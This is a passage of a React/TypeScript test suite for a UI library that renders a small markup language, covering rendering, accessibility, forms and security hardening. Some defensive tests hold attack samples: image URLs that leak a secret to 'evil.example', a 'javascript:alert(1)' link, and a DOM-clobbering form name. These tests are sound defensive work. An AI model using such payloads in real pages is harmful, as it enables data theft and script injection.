    // Once it arrives the button opens it.
    rerender(<GistUI library={ui} source={`root = Stack(b)\nb = Button("Invite", opens:dlg)\ndlg = Dialog("Invite", "Hello")\n`} />);
    click(host.querySelector(".gistui-button"));
    expect(host.querySelector(".gistui-dialog")!.textContent).toContain("Hello");
    unmount();
  });
});

describe("X22: a complete `source` renders on the server", () => {
  test("renderToString has the content; onError still fires once on the client", async () => {
    const { renderToString } = await import("react-dom/server");
    const src = `root = Card(Header("Q3 revenue", "All regions"), Stat("Revenue", "$1.2M"))\n`;
    const html = renderToString(<GistUI library={ui} source={src} />);
    expect(html).toContain("Q3 revenue");
    expect(html).toContain("$1.2M");
    const errors: unknown[][] = [];
    const { host, unmount } = mount(<GistUI library={ui} source={src} onError={(e) => errors.push(e)} />);
    expect(host.querySelector(".gistui-header__title")!.textContent).toBe("Q3 revenue");
    expect(errors).toEqual([[]]);
    unmount();
  });

  test("a server render calls no tool and leaves no timer; the mounted UI loads its data; `paused` stops refreshes", async () => {
    const { renderToString } = await import("react-dom/server");
    let calls = 0;
    const tools = { orders: async () => (calls++, [{ Order: `#${calls}` }]) };
    const src = `root = Stack(Table(q))\nq = @query("orders", {}, default:[], every:5)\n`;
    renderToString(<GistUI library={ui} source={src} tools={tools} />);
    await new Promise((r) => setTimeout(r, 30));
    expect(calls).toBe(0);
    const { host, unmount } = mount(<GistUI library={ui} source={src} tools={tools} paused />);
    await act(async () => {
      await new Promise((r) => setTimeout(r, 30));
    });
    // Loaded once; with `paused` no timer runs (the 5 s refresh is not waited for here).
    expect(calls).toBe(1);
    expect(host.textContent).toContain("#1");
    unmount();
  });
});

describe("X22: callbacks from the first-render parse", () => {
  test("onProse runs after the render (it may set the host's state), once, also under StrictMode", () => {
    const logged: string[] = [];
    const orig = console.error;
    console.error = (...args: unknown[]) => void logged.push(args.map(String).join(" "));
    const calls: string[] = [];
    function Chat() {
      const [prose, setProse] = useState("");
      return (
        <div>
          <p className="prose">{prose}</p>
          <GistUI
            library={ui}
            inline
            source={'Here it is:\n```gistui\nroot = Card(Header("Hi"))\n```\n'}
            onProse={(t) => {
              calls.push(t);
              setProse((p) => p + t);
            }}
          />
        </div>
      );
    }
    try {
      const { host, unmount } = mount(
        <StrictMode>
          <Chat />
        </StrictMode>,
      );
      expect(host.querySelector(".gistui-header__title")!.textContent).toBe("Hi");
      expect(host.querySelector(".prose")!.textContent).toContain("Here it is:");
      expect(calls.join("")).toBe(host.querySelector(".prose")!.textContent!);
      expect(calls.filter((c) => c.includes("Here it is:"))).toHaveLength(1);
      unmount();
    } finally {
      console.error = orig;
    }
    expect(logged.filter((l) => l.includes("while rendering a different component"))).toEqual([]);
  });
});

describe("X23: the form-schema chunk fails to load", () => {
  test("the submit still reaches the host (plain values), and only then is success shown", async () => {
    const { schemaModule } = await import("../src/ui/form");
    const loaded = schemaModule.current;
    const load = schemaModule.load;
    schemaModule.current = null;
    schemaModule.load = () => Promise.reject(new Error("Failed to fetch dynamically imported module"));
    const actions: GistUIAction[] = [];
    try {
      const { host, unmount } = mount(<GistUI library={ui} source={`root = Form("contact", Input("email", "Email", required), success:"Thanks!")\n`} onAction={(a) => actions.push(a)} />);
      typeInto(host.querySelector<HTMLInputElement>('input[name="email"]')!, "ada@example.com");
      click(host.querySelector('button[type="submit"]'));
      // Not before the submit is out.
      expect(host.textContent).not.toContain("Thanks!");
      await wait(20);
      expect(actions).toHaveLength(1);
      expect(actions[0]).toMatchObject({ type: "submit", form: "contact", partial: false, values: { email: "ada@example.com" }, fields: [], schema: {} });
      expect((actions[0] as { message: string }).message).toContain("- Email: ada@example.com");
      expect(host.textContent).toContain("Thanks!");
      unmount();
    } finally {
      schemaModule.current = loaded;
      schemaModule.load = load;
    }
  });
});

describe("X24: accessibility", () => {
  test("the time list is one tab stop, moved with the arrow keys", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = DatePicker("at", "Starts", time, value:"2026-10-01T10:00")\n`} />);
    const options = Array.from(host.querySelectorAll<HTMLElement>('.gistui-dp__times [role="option"]'));
    expect(options.length).toBeGreaterThan(10);
    const stops = options.filter((o) => o.tabIndex === 0);
    expect(stops).toHaveLength(1);
    expect(stops[0]!.getAttribute("aria-selected")).toBe("true");
    expect(options.filter((o) => o.getAttribute("tabindex") === "-1")).toHaveLength(options.length - 1);
    act(() => stops[0]!.focus());
    const at = options.indexOf(stops[0]!);
    act(() => void stops[0]!.dispatchEvent(new KeyboardEvent("keydown", { key: "ArrowDown", bubbles: true, cancelable: true })));
    expect(document.activeElement).toBe(options[at + 1]!);
    act(() => void options[at + 1]!.dispatchEvent(new KeyboardEvent("keydown", { key: "Home", bubbles: true, cancelable: true })));
    expect(document.activeElement).toBe(options[0]!);
    unmount();
  });

  test("an error is announced from its control, with ids that do not collide across forms", () => {
    const form = (n: string) => `Form("${n}", RadioGroup("plan", "Plan", ["Free", "Pro"], required), CheckboxGroup("topics", "Topics", ["AI", "Data"], required), Select("size", "Size", ["S", "M"], required), Combobox("city", "City", ["Oslo", "Rome"], required), TagInput("cc", "CC", required), DatePicker("due", "Due", required), TimePicker("slot", "Time", required), Button("Save"))`;
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Stack(a, b)\na = ${form("a")}\nb = ${form("b")}\n`} />);
    for (const b of Array.from(q(host, 'button[type="submit"]'))) click(b);
    const errs = Array.from(q(host, ".gistui-field__error"));
    expect(errs).toHaveLength(14);
    const ids = errs.map((e) => e.id);
    expect(new Set(ids).size).toBe(14);
    // Every error is pointed at by exactly one control, which is marked invalid.
    for (const id of ids) {
      const described = host.querySelectorAll(`[aria-describedby="${CSS.escape(id)}"]`);
      expect(described).toHaveLength(1);
      const control = described[0]!;
      const invalid = control.getAttribute("aria-invalid") === "true" || control.querySelector('[aria-invalid="true"]') !== null;
      expect(invalid).toBe(true);
    }
    // The field roots carry the error state too (Zag's own attribute used to erase it).
    for (const kind of ["Select", "Combobox", "TimePicker", "DatePicker", "TagInput"]) expect(host.querySelector(`[data-gistui="${kind}"]`)!.hasAttribute("data-invalid")).toBe(true);
    unmount();
  });

  test("a checkbox group and a carousel have accessible names", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Stack(CheckboxGroup("topics", "Topics", ["AI", "Data"]), Carousel(Card("a"), Card("b")))\n`} />);
    const group = host.querySelector('[role="group"]')!;
    expect(document.getElementById(group.getAttribute("aria-labelledby")!)!.textContent).toBe("Topics");
    expect(host.querySelector('[aria-roledescription="carousel"]')!.getAttribute("aria-label")).toBe("Carousel");
    unmount();
  });
});

describe("X25: API and dead code", () => {
  test("every default component is a named export of @gistui/react/ui; useRun and useLazyWidget of the index", async () => {
    const mod = (await import("../src/ui")) as unknown as Record<string, unknown>;
    for (const name of ["DatePicker", "TimePicker", "Slider", "Code", "MathView", "Diagram", "Video", "Avatar", "KeyValue", "Pricing", "Hero", "Frame"]) expect(typeof mod[name]).toBe("function");
    const index = (await import("../src/index")) as unknown as Record<string, unknown>;
    expect(typeof index.useRun).toBe("function");
    expect(typeof index.useLazyWidget).toBe("function");
  });

  test("Hero's button is locked while streaming, like Button", () => {
    const src = `root = Hero("Launch", "Soon", cta:"Notify me")\n`;
    const { host, rerender, unmount } = mount(<GistUI library={ui} source={src} streaming />);
    expect(host.querySelector<HTMLButtonElement>(".gistui-hero .gistui-button")!.disabled).toBe(true);
    rerender(<GistUI library={ui} source={src} />);
    expect(host.querySelector<HTMLButtonElement>(".gistui-hero .gistui-button")!.disabled).toBe(false);
    unmount();
  });

  test("an option listed twice renders once (no duplicate React keys)", async () => {
    const logged: string[] = [];
    const orig = console.error;
    console.error = (...args: unknown[]) => void logged.push(args.map(String).join(" "));
    try {
      const src = `root = Stack(RadioGroup("r", "R", ["A", "B", "A"], hints:["first", "second", "third"]), CheckboxGroup("c", "C", ["A", "A", "B"]), Select("s", "S", ["A", "A", "B"]), Combobox("k", "K", ["A", "A", "B"]), TagInput("t", "T", options:["A", "A", "B"], value:["x", "x"]))\n`;
      const { host, unmount } = mount(<GistUI library={ui} source={src} />);
      expect(q(host, '[data-gistui="RadioGroup"] .gistui-choice__item')).toHaveLength(2);
      // The first position keeps its hint; the next option keeps its own.
      expect(Array.from(q(host, '[data-gistui="RadioGroup"] .gistui-choice__hint')).map((e) => e.textContent)).toEqual(["first", "second"]);
      expect(q(host, '[data-gistui="CheckboxGroup"] .gistui-choice__item')).toHaveLength(2);
      expect(q(host, '[data-gistui="Select"] .gistui-option')).toHaveLength(2);
      expect(q(host, '[data-gistui="Combobox"] .gistui-option')).toHaveLength(2);
      expect(q(host, '[data-gistui="TagInput"] .gistui-tag')).toHaveLength(1);
      expect(q(host, '[data-gistui="TagInput"] .gistui-chip')).toHaveLength(2);
      unmount();
    } finally {
      console.error = orig;
    }
    expect(logged.filter((l) => l.includes("same key"))).toEqual([]);
  });

  test("Gallery opens its lightbox at once (the shared useLightbox, with the viewer already loaded)", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Gallery(["https://example.com/a.png", "https://example.com/b.png"])\n`} />);
    click(q(host, ".gistui-gallery__item")[1]);
    expect(host.querySelector(".gistui-lightbox__count")!.textContent).toBe("2 / 2");
    unmount();
  });
});

describe("security hardening", () => {
  test("S7: a Form's name is not a `name` attribute (it would shadow document properties)", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Form("getElementById", Input("q", "Q"))\n`} />);
    const form = host.querySelector("form")!;
    expect(form.hasAttribute("name")).toBe(false);
    expect(form.getAttribute("data-form-name")).toBe("getElementById");
    expect(typeof document.getElementById).toBe("function");
    unmount();
  });

  test("S14: a password field never asks for saved credentials", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Stack(Input("pw", "Password", type:password), Input("email", "Email", type:email))\n`} />);
    expect(host.querySelector('input[name="pw"]')!.getAttribute("autocomplete")).toBe("new-password");
    expect(host.querySelector('input[name="email"]')!.getAttribute("autocomplete")).toBe("email");
    unmount();
  });

  test("S16: KaTeX sizes are bounded", async () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Math("\\\\rule{500em}{500em}")\n`} />);
    for (let i = 0; i < 100 && !host.querySelector("math"); i++) await wait(10);
    const html = host.querySelector('[data-gistui="Math"]')!.innerHTML;
    expect(html).toContain('width="50em"');
    expect(html).not.toContain('width="500em"');
    unmount();
  });

  test("S17: images from program URLs send no referrer", () => {
    const u = "https://example.com/a.png";
    const src = `root = Stack(Image("${u}"), Media("${u}", "Title"), Tile("T", image:"${u}"), Avatar("Ann", src:"${u}"), Hero("H", image:"${u}"), Gallery(["${u}"]), RadioGroup("r", "R", ["A"], images:["${u}"], v:cards), Slides(Slide("x", image:"${u}"), ratio:"auto"))\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    const imgs = Array.from(host.querySelectorAll("img"));
    // One per component above.
    expect(imgs).toHaveLength(8);
    expect(imgs.filter((i) => i.getAttribute("referrerpolicy") !== "no-referrer").map((i) => i.outerHTML)).toEqual([]);
    // The lightbox too.
    click(host.querySelector(".gistui-gallery__item"));
    expect(Array.from(host.querySelectorAll(".gistui-lightbox img")).every((i) => i.getAttribute("referrerpolicy") === "no-referrer")).toBe(true);
    unmount();
  });

  test("S18: program-chosen sizes are clamped", async () => {
    const rows = (n: number) => Array.from({ length: n }, (_, i) => `|r${i}|${i}`).join("\n");
    // pageSize:0 is one page, up to 200 rows; a longer table pages at 200. A huge pageSize is capped at 200.
    const zero = mount(<GistUI library={ui} source={`root = Table(t, pageSize:0)\nt = |Name|Score\n${rows(15)}\n`} />);
    expect(zero.host.querySelectorAll("tbody tr")).toHaveLength(15);
    zero.unmount();
    const long = mount(<GistUI library={ui} source={`root = Table(t, pageSize:0)\nt = |Name|Score\n${rows(450)}\n`} />);
    expect(long.host.querySelectorAll("tbody tr")).toHaveLength(200);
    long.unmount();
    const huge = mount(<GistUI library={ui} source={`root = Table(t, pageSize:100000)\nt = |Name|Score\n${rows(250)}\n`} />);
    expect(q(huge.host, "tbody tr")).toHaveLength(200);
    huge.unmount();
    const small = mount(<GistUI library={ui} source={`root = Table(t, pageSize:5)\nt = |Name|Score\n${rows(15)}\n`} />);
    expect(q(small.host, "tbody tr")).toHaveLength(5);
    small.unmount();
    const cell = mount(<GistUI library={ui} source={`root = Grid(Cell("a", rows:100000, span:2), Cell("b", rows:2))\n`} />);
    const spans = Array.from(cell.host.querySelectorAll<HTMLElement>('[data-gistui="Cell"]')).map((c) => c.style.getPropertyValue("--gistui-row-span"));
    expect(spans).toEqual(["12", "2"]);
    cell.unmount();
    const chart = mount(<GistUI library={ui} source={`root = Stack(Chart(t, height:99999), Chart(t, height:1))\nt = |M|V\n|a|1\n|b|2\n`} />);
    await wait(20);
    expect(Array.from(chart.host.querySelectorAll(".gistui-chart__svg")).map((s) => s.getAttribute("height"))).toEqual(["1200", "80"]);
    chart.unmount();
  });

  test("S18: a long sparkline does not go through an argument list", () => {
    const Stat = ui.components.get("Stat")!;
    const values = Array.from({ length: 150_000 }, (_, i) => i % 97);
    const node = { id: "s", type: "Stat", props: {}, children: [], partial: false, stmt: "s" };
    const { host, unmount } = mount(<Stat node={node} props={{ label: "Load", value: "1", spark: values }} childIds={[]} renderNode={() => null}>{null}</Stat>);
    expect(host.querySelector(".gistui-stat__spark")).not.toBeNull();
    unmount();
  });
});

describe("performance: an inline `classNames` object does not re-render design-layer components", () => {
  test("a Card renders a constant number of times while chunks arrive", () => {
    let renders = 0;
    function CountingCard({ props, children }: ComponentProps) {
      const d = useDesign("Card", props);
      renders++;
      return <section className={d.className}>{children}</section>;
    }
    const lib = ui.extend({ Card: CountingCard });
    const src = `root = Stack(c, t)\nc = Card(Header("Done early"))\nt = Text("${"lorem ipsum ".repeat(40)}")\n`;
    const m = mount(<GistUI library={lib} source="" streaming classNames={{ Card: "rounded" }} />);
    let chunks = 0;
    for (let i = 8; i < src.length; i += 8, chunks++) m.rerender(<GistUI library={lib} source={src.slice(0, i)} streaming classNames={{ Card: "rounded" }} />);
    m.rerender(<GistUI library={lib} source={src} classNames={{ Card: "rounded" }} />);
    expect(chunks).toBeGreaterThan(50);
    expect(m.host.querySelector("section.rounded")).not.toBeNull();
    expect(renders).toBeLessThan(8);
    // A different map does reach the components.
    m.rerender(<GistUI library={lib} source={src} classNames={{ Card: "square" }} />);
    expect(m.host.querySelector("section.square")).not.toBeNull();
    m.unmount();
  });
});

describe("S2: URLs that load by themselves", () => {
  const program = `d = {secret: "s3cr3t", img: "https://cdn.shop.example/a.png"}
root = Stack(Image("https://evil.example/p.png?d=" + d.secret, alt:"built"), Image(d.img, alt:"data"), Image("https://pics.example/x.png", alt:"static"), Text("![md](https://evil.example/md.png?d=" + d.secret + ")"), Text("![ok](https://pics.example/md.png)"))
`;
  const srcs = (host: HTMLElement) => [...host.querySelectorAll("img")].map((i) => i.getAttribute("src"));

  test("an image URL assembled from data is not loaded, as a prop or in Markdown", async () => {
    const { host, unmount } = mount(<GistUI library={ui} source={program} />);
    await act(async () => {
      await new Promise((r) => setTimeout(r, 20));
    });
    const all = srcs(host);
    expect(all.some((u) => u?.includes("evil.example"))).toBe(false);
    expect(all).toContain("https://cdn.shop.example/a.png");
    expect(all).toContain("https://pics.example/x.png");
    expect(all).toContain("https://pics.example/md.png");
    unmount();
  });

  test("allowedHosts: only those hosts load", async () => {
    const { host, unmount } = mount(<GistUI library={ui} source={program} allowedHosts={["cdn.shop.example"]} />);
    await act(async () => {
      await new Promise((r) => setTimeout(r, 20));
    });
    expect(srcs(host).filter(Boolean)).toEqual(["https://cdn.shop.example/a.png"]);
    unmount();
  });
});


describe("C2: Select and Combobox take an initial `value:`", () => {
  const src = `$s = "S"\nroot = Form("f", Select("size", "Size", ["S", "M"], value:"M"), Select("many", "Many", ["a", "b", "c"], multiple, value:["a", "c", "zz"]), Select("none", "None", ["S", "M"], value:"XL"), Select("bound", "Bound", ["S", "M"], value:"M", bind:$s), Combobox("city", "City", ["Oslo", "Rome"], value:"Rome"), Combobox("cities", "Cities", ["Oslo", "Rome", "Bern"], multiple, value:["Oslo", "Bern", "Zzz"]), Combobox("no", "No", ["Oslo"], value:"Paris"), Button("Reset", v:secondary, type:reset), Button("Save"))\n`;
  const text = (host: HTMLElement) => Array.from(q(host, '[data-gistui="Select"] [data-part="value-text"]')).map((e) => e.textContent);
  const cities = (host: HTMLElement) => Array.from(host.querySelectorAll<HTMLInputElement>('[data-scope="combobox"][data-part="input"]')).map((i) => i.value);
  const chips = (host: HTMLElement) => Array.from(q(host, ".gistui-combobox__chips .gistui-tag")).map((t) => t.textContent);

  test("it is the initial choice; an option not in the list is ignored; `bind:` wins", async () => {
    const actions: GistUIAction[] = [];
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    await wait(5);
    expect(text(host)).toEqual(["M", "a, c", "Select…", "S"]);
    expect(cities(host)).toEqual(["Rome", "", ""]);
    expect(chips(host)).toEqual(["Oslo", "Bern"]);
    expect(Array.from(host.querySelectorAll<HTMLOptionElement>('select[name="many"] option')).map((o) => o.selected)).toEqual([true, false, true]);
    click(host.querySelector('button[type="submit"]'));
    expect(actions.at(-1)).toMatchObject({ type: "submit", values: { size: "M", bound: "S", city: "Rome", cities: ["Oslo", "Bern"] } });
    unmount();
  });

  test("a form reset returns to it", async () => {
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    await wait(5);
    const pick = async (root: Element, label: string) => {
      const trigger = root.querySelector<HTMLElement>('[data-part="trigger"]')!;
      act(() => trigger.focus());
      click(trigger);
      await wait(20);
      click(Array.from(root.querySelectorAll('[data-part="item"]')).find((li) => li.textContent === label));
      await wait(20);
    };
    await pick(q(host, '[data-gistui="Select"]')[0]!, "S");
    await pick(q(host, '[data-gistui="Combobox"]')[0]!, "Oslo");
    expect(text(host)[0]).toBe("S");
    expect(cities(host)[0]).toBe("Oslo");
    click(Array.from(host.querySelectorAll("button")).find((b) => b.textContent === "Reset"));
    await wait(10);
    expect(text(host)).toEqual(["M", "a, c", "Select…", "S"]);
    expect(cities(host)).toEqual(["Rome", "", ""]);
    expect(chips(host)).toEqual(["Oslo", "Bern"]);
    expect(Array.from(host.querySelectorAll<HTMLInputElement>('input[type="hidden"][name="city"]')).map((i) => i.value)).toEqual(["Rome"]);
    unmount();
  });
});

describe("C3: DatePicker(time) follows a bound value set from elsewhere", () => {
  test("after a time was picked by hand, the program's new value shows and submits its own time", async () => {
    const actions: GistUIAction[] = [];
    const src = `$at = "2026-10-01T14:30"\nroot = Form("f", DatePicker("at", "Starts", time, bind:$at), Button("Move", v:secondary, do:[@set($at, "2026-12-24T09:30")]), Button("Save"))\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    await wait(5);
    const chip = () => host.querySelector(".gistui-dp__time-chip")!.textContent;
    expect(chip()).toBe("2:30 PM");
    click(Array.from(q(host, ".gistui-dp__time")).find((b) => b.textContent === "4:00 PM"));
    await wait(5);
    expect(chip()).toBe("4:00 PM");
    click(Array.from(host.querySelectorAll("button")).find((b) => b.textContent === "Move"));
    await wait(5);
    expect(chip()).toBe("9:30 AM");
    expect(host.querySelector<HTMLInputElement>('input[type="hidden"][name="at"]')!.value).toBe("2026-12-24T09:30");
    click(host.querySelector('button[type="submit"]'));
    expect(actions.at(-1)).toMatchObject({ type: "submit", values: { at: "2026-12-24T09:30" } });
    unmount();
  });
});

describe("K4: mailto and tel links", () => {
  test("a Button with a mailto: or tel: href is a link, not a send button", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Stack(Button("Email us", href:"mailto:a@b.co"), Button("Call", href:"tel:+15550100"), Button("Bad", href:"javascript:alert(1)"))\n`} />);
    const links = [...host.querySelectorAll("a.gistui-button")].map((a) => a.getAttribute("href"));
    expect(links).toEqual(["mailto:a@b.co", "tel:+15550100"]);
    expect(host.querySelectorAll("button.gistui-button")).toHaveLength(1);
    unmount();
  });
});

describe("required marker on Zag-labelled fields", () => {
  test("Select, Combobox, TimePicker and RadioGroup labels carry data-required", () => {
    const src = `root = Form("f", Select("a", "A", ["x"], required), Combobox("b", "B", ["x"], required), TimePicker("c", "C", required), RadioGroup("d", "D", ["x"], required))\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    const labels = [...host.querySelectorAll(".gistui-field__label")];
    expect(labels.map((l) => l.textContent)).toEqual(["A", "B", "C", "D"]);
    expect(labels.every((l) => l.hasAttribute("data-required"))).toBe(true);
    unmount();
  });
});

